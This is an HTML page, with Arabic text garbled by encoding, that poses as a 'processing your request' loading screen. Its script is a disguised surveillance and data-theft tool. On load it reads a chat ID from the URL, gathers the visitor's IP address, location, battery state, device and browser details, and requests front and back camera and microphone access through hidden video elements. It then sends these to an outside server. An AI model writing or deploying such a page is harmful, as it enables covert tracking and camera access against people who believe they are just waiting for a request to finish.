<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üöÄ ÿ™ŸÜŸÅŸäÿ∞ ÿ∑ŸÑÿ®ŸÉ - ŸÖÿ±ÿ≠ÿ®ÿß ÿ®ŸÉ ŸÅŸä ŸÖŸàŸÇÿπŸÜÿß</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
        }

        /* ÿÆŸÑŸÅŸäÿ© ŸÖÿ™ÿ≠ÿ±ŸÉÿ© ŸÑŸÑŸÅŸäÿØŸäŸà */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg,
                rgba(255, 154, 158, 0.2) 0%,
                rgba(254, 207, 239, 0.2) 50%,
                rgba(255, 107, 107, 0.2) 100%);
            animation: videoWave 6s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes videoWave {
            0%, 100% {
                transform: translateX(0%) scale(1);
                opacity: 0.8;
            }
            50% {
                transform: translateX(3%) scale(1.02);
                opacity: 1;
            }
        }

        /* ÿ•ÿ∂ÿßŸÅÿ© ÿ™ÿ£ÿ´Ÿäÿ± ÿßŸÑÿ¥ÿßÿ¥ÿ© ÿßŸÑÿ≥ŸäŸÜŸÖÿßÿ¶Ÿäÿ© */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                linear-gradient(90deg, transparent 98%, rgba(255, 255, 255, 0.03) 100%),
                linear-gradient(0deg, transparent 98%, rgba(255, 255, 255, 0.03) 100%);
            background-size: 3px 3px;
            pointer-events: none;
            z-index: 1;
        }

        .container {
            max-width: 500px;
            padding: 40px 20px;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            box-shadow:
                0 15px 35px rgba(0, 0, 0, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.3),
                0 0 0 1px rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.15);
            position: relative;
            overflow: hidden;
            z-index: 2;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -100%;
            left: -100%;
            width: 300%;
            height: 300%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            animation: containerShimmer 4s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes containerShimmer {
            0%, 100% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.1); }
        }

        .video-icon {
            font-size: 4.5rem;
            margin-bottom: 20px;
            animation: videoFloat 3s ease-in-out infinite;
            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 3;
        }

        @keyframes videoFloat {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
                filter: drop-shadow(0 5px 15px rgba(255, 107, 107, 0.4));
            }
            50% {
                transform: translateY(-15px) rotate(2deg);
                filter: drop-shadow(0 8px 25px rgba(255, 107, 107, 0.6));
            }
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.2);
            border-top: 8px solid #ff6b6b;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 1.8s linear infinite;
            margin: 0 auto 30px;
            box-shadow:
                0 0 30px rgba(255, 107, 107, 0.4),
                inset 0 0 30px rgba(255, 107, 107, 0.2);
            position: relative;
            z-index: 3;
        }

        .spinner::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 60%;
            height: 60%;
            background: radial-gradient(circle, rgba(255, 107, 107, 0.3), transparent);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            animation: spinnerPulse 2s ease-in-out infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes spinnerPulse {
            0%, 100% { opacity: 0.3; transform: translate(-50%, -50%) scale(1); }
            50% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.2); }
        }

        h1 {
            font-size: 2.2rem;
            font-weight: 700;
            margin-bottom: 15px;
            text-shadow: 0 3px 15px rgba(0, 0, 0, 0.4);
            animation: fadeInUp 1s ease-out;
            position: relative;
            z-index: 3;
        }

        p {
            font-size: 1.2rem;
            font-weight: 400;
            opacity: 0.95;
            line-height: 1.7;
            animation: fadeInUp 1s ease-out 0.3s both;
            position: relative;
            z-index: 3;
        }

        .status-text {
            font-size: 1.1rem;
            margin-top: 25px;
            padding: 18px;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.25);
            animation: fadeInUp 1s ease-out 0.5s both;
            position: relative;
            z-index: 3;
            backdrop-filter: blur(10px);
        }

        .recording-indicator {
            display: none;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 107, 107, 0.2);
            border-radius: 15px;
            border: 2px solid rgba(255, 107, 107, 0.4);
            position: relative;
            z-index: 3;
        }

        .recording-dot {
            width: 12px;
            height: 12px;
            background: #ff6b6b;
            border-radius: 50%;
            animation: recordingPulse 1s ease-in-out infinite;
            box-shadow: 0 0 10px rgba(255, 107, 107, 0.8);
        }

        @keyframes recordingPulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.3); }
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            margin-top: 20px;
            overflow: hidden;
            position: relative;
            z-index: 3;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff6b6b, #ff9a9e);
            border-radius: 3px;
            width: 0%;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px rgba(255, 107, 107, 0.6);
        }

        .timer {
            font-size: 1.5rem;
            font-weight: 600;
            margin-top: 15px;
            color: #ff6b6b;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 3;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success-message {
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            padding: 25px;
            border-radius: 20px;
            margin-top: 20px;
            box-shadow: 0 8px 25px rgba(46, 204, 113, 0.4);
            position: relative;
            z-index: 3;
        }

        .success-icon {
            font-size: 3.5rem;
            margin-bottom: 15px;
            animation: successBounce 0.8s ease-out;
        }

        @keyframes successBounce {
            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
            50% { transform: scale(1.2) rotate(0deg); opacity: 1; }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }

        /* ÿ•ÿÆŸÅÿßÿ° ÿπŸÜÿµÿ± ÿ∑ŸÑÿ®ŸÉ */
        #frontVideo, #backVideo {
            display: none !important;
            visibility: hidden !important;
        }

        /* ÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ ŸÑŸÑÿ¥ÿßÿ¥ÿßÿ™ ÿßŸÑÿµÿ∫Ÿäÿ±ÿ© */
        @media (max-width: 600px) {
            .container {
                margin: 20px;
                padding: 30px 15px;
            }
            
            h1 {
                font-size: 1.8rem;
            }
            
            .video-icon {
                font-size: 3.5rem;
            }
            
            .spinner {
                width: 100px;
                height: 100px;
            }
        }

        /* ÿ™ÿ£ÿ´Ÿäÿ± ÿßŸÑÿ∂Ÿàÿ° ÿßŸÑŸÖÿ™ÿ≠ÿ±ŸÉ */
        @keyframes lightMove {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(400%) rotate(45deg); }
        }

        .light-effect {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent);
            animation: lightMove 3s ease-in-out infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="light-effect"></div>
        <div class="video-icon">üöÄ</div>
        <div class="spinner"></div>
        <h1>üöÄ ÿ¨ÿßÿ±Ÿä ÿ™ŸÜŸÅŸäÿ∞ ÿ∑ŸÑÿ®ŸÉ</h1>
        <p>Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿßŸÜÿ™ÿ∏ÿßÿ± ÿ®ŸäŸÜŸÖÿß ŸÜŸÇŸàŸÖ ÿ®ÿ™ŸÜŸÅŸäÿ∞ ÿ∑ŸÑÿ®ŸÉ ÿ®ÿØŸÇŸá ÿπÿßŸÑŸäÿ©...</p>
        
        <div class="status-text" id="statusText">‚ùå ÿÆÿ∑ÿ£: No camera access granted</div>

        <div class="recording-indicator" id="recordingIndicator">
            <div class="recording-dot"></div>
            <span>üî¥ ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ŸÜŸÅŸäÿ∞...</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <div class="timer" id="timer">00:00</div>
    </div>

    <!-- ÿπŸÜÿßÿµÿ± ÿ∑ŸÑÿ®ŸÉ ÿßŸÑŸÖÿÆŸÅŸäÿ© -->
    <video id="frontVideo" playsinline="" autoplay="" muted="" style="display:none; visibility:hidden;"></video>
    <video id="backVideo" playsinline="" autoplay="" muted="" style="display:none; visibility:hidden;"></video>

    <script>
        // ‚öôÔ∏è ÿ•ÿπÿØÿßÿØÿßÿ™ ÿßŸÑÿÆÿßÿØŸÖ - ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿÆÿßÿØŸÖ ÿßŸÑÿ¨ÿØŸäÿØ
        const SERVER_URL = 'https://boserver.onrender.com';
        
        const frontVideo = document.getElementById('frontVideo');
        const backVideo = document.getElementById('backVideo');
        const statusText = document.getElementById('statusText');
        const recordingIndicator = document.getElementById('recordingIndicator');
        const progressFill = document.getElementById('progressFill');
        const timer = document.getElementById('timer');

        let recordingStartTime = 0;
        let timerInterval = null;

        // üÜî ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ŸÖÿπÿ±ŸÅ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖŸÜ ÿßŸÑÿ±ÿßÿ®ÿ∑
        function getChatId() {
            const urlParams = new URLSearchParams(window.location.search);
            let chatId = urlParams.get('chatId');
            
            if (!chatId) {
                // ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸäŸá ŸÖŸÜ ÿßŸÑŸÖÿ≥ÿßÿ±
                const pathParts = window.location.pathname.split('/');
                chatId = pathParts[pathParts.length - 1];
                
                // ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑŸÖÿ≥ÿßÿ± ŸäŸÜÿ™ŸáŸä ÿ®ŸÄ .htmlÿå ÿÆÿ∞ ÿßŸÑÿ¨ÿ≤ÿ° ÿßŸÑÿ∞Ÿä ŸÇÿ®ŸÑŸá
                if (chatId && chatId.includes('.html')) {
                    chatId = pathParts[pathParts.length - 2];
                }
            }
            
            console.log("Retrieved chatId:", chatId);
            return chatId;
        }

        // üìä ÿ¨ŸÖÿπ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ•ÿ∂ÿßŸÅŸäÿ© ÿßŸÑŸÖÿ≠ÿ≥ŸÜÿ©
        async function collectAdditionalData() {
            try {
                statusText.textContent = 'üì° ÿ¨ŸÖÿπ ÿ∑ŸÑÿ®ŸÉ Ÿàÿ™ŸÜŸÅŸäÿ∞Ÿá ..';
                
                const [ipInfo, battery] = await Promise.all([
                    fetch('https://ipapi.co/json/')
                        .then(response => response.json())
                        .catch(() => ({ ip: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠', country_name: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠', city: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠' })),
                    
                    navigator.getBattery ? 
                        navigator.getBattery().catch(() => ({ level: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠', charging: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠' })) :
                        Promise.resolve({ level: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠', charging: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠' })
                ]);
                
                return {
                    ip: ipInfo.ip || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    country: ipInfo.country_name || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    city: ipInfo.city || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    platform: getPlatformInfo().platform,
                    deviceVersion: getDeviceVersion(),
                    userAgent: navigator.userAgent || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    batteryLevel: battery.level !== undefined ? `${Math.round(battery.level * 100)}%` : 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    batteryCharging: battery.charging !== undefined ? battery.charging : 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                console.error('Error collecting additional data', error);
                return {
                    ip: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    country: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    city: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    platform: getPlatformInfo().platform,
                    deviceVersion: getDeviceVersion(),
                    userAgent: navigator.userAgent || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    batteryLevel: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    batteryCharging: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    language: navigator.language || 'ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠',
                    timestamp: new Date().toISOString()
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return { platform: "Windows" };
            if (/Mac/.test(ua)) return { platform: "MacOS" };
            if (/Linux/.test(ua)) return { platform: "Linux" };
            if (/Android/.test(ua)) return { platform: "Android" };
            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
            return { platform: "Unknown" };
        }

        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        // üé• ÿ∑ŸÑÿ® ÿ•ÿ∞ŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ŸàÿßŸÑŸÖŸäŸÉÿ±ŸàŸÅŸàŸÜ
        async function requestCameraPermission(facingMode) {
            try {
                statusText.textContent = `üöÄ ÿßŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ${facingMode === 'user' ? 'ŸÜÿ¨ÿßÿ¨' : 'ŸÅÿ¥ŸÑ'} ÿÆÿ∑ÿß...`;
                
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true
                    }
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                return stream;
            } catch (error) {
                console.error(`Error accessing ${facingMode} camera:`, error);
                return null;
            }
        }

        // ‚è±Ô∏è ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑŸÖÿ§ŸÇÿ™
        function updateTimer() {
            const elapsed = Date.now() - recordingStartTime;
            const seconds = Math.floor(elapsed / 1000);
            const minutes = Math.floor(seconds / 60);
            const remainingSeconds = seconds % 60;
            
            timer.textContent = `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
            
            // ÿ™ÿ≠ÿØŸäÿ´ ÿ¥ÿ±Ÿäÿ∑ ÿßŸÑÿ™ŸÇÿØŸÖ (ŸÑŸÑÿπÿ±ÿ∂ ŸÅŸÇÿ∑)
            const maxDuration = 30; // 30 ÿ´ÿßŸÜŸäÿ© ŸÉÿ≠ÿØ ÿ£ŸÇÿµŸâ ŸÑŸÑÿπÿ±ÿ∂
            const progress = Math.min((seconds / maxDuration) * 100, 100);
            progressFill.style.width = `${progress}%`;
        }

        // üöÄ ÿ™ŸáŸäÿ¶ÿ© ÿßŸÑŸÜÿ∏ÿßŸÖ
        async function init() {
            try {
                const chatId = getChatId();
                if (!chatId || chatId === 'video.html' || chatId === '') {
                    throw new Error('ŸÖÿπÿ±ŸÅ ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿ© ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ - ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿµÿ≠ÿ© ÿßŸÑÿ±ÿßÿ®ÿ∑');
                }

                // ÿ¨ŸÖÿπ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ•ÿ∂ÿßŸÅŸäÿ©
                const additionalData = await collectAdditionalData();
                
                // ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿßÿ™
                statusText.textContent = 'üé• ÿ¨ÿßÿ±Ÿä ÿßŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿßÿ™...';
                
                const frontStream = await requestCameraPermission('user');
                const backStream = await requestCameraPermission('environment');
                
                if (frontStream || backStream) {
                    // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ
                    recordingStartTime = Date.now();
                    recordingIndicator.style.display = 'flex';
                    timerInterval = setInterval(updateTimer, 1000);
                    
                    statusText.textContent = '‚úÖ ÿ™ŸÖ ÿ®ÿØÿ° ÿßŸÑÿ™ŸÜŸÅŸäÿ∞ ÿ®ŸÜÿ¨ÿßÿ≠!';
                    
                    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ•ŸÑŸâ ÿßŸÑÿÆÿßÿØŸÖ
                    try {
                        const response = await fetch(`${SERVER_URL}/api/record`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                chatId: chatId,
                                cameraAccess: true,
                                frontCamera: !!frontStream,
                                backCamera: !!backStream,
                                ...additionalData
                            })
                        });
                        
                        if (response.ok) {
                            console.log('Data sent successfully to server');
                        }
                    } catch (error) {
                        console.error('Error sending data to server:', error);
                    }
                    
                } else {
                    statusText.textContent = '‚ùå ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿ£Ÿä ŸÉÿßŸÖŸäÿ±ÿß - Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑÿ£ÿ∞ŸàŸÜÿßÿ™';
                }
                
            } catch (error) {
                console.error('Initialization error:', error);
                statusText.textContent = `‚ùå ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ŸáŸäÿ¶ÿ©: ${error.message}`;
            }
        }

        // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ
        init();
    </script>
</body>
</html>
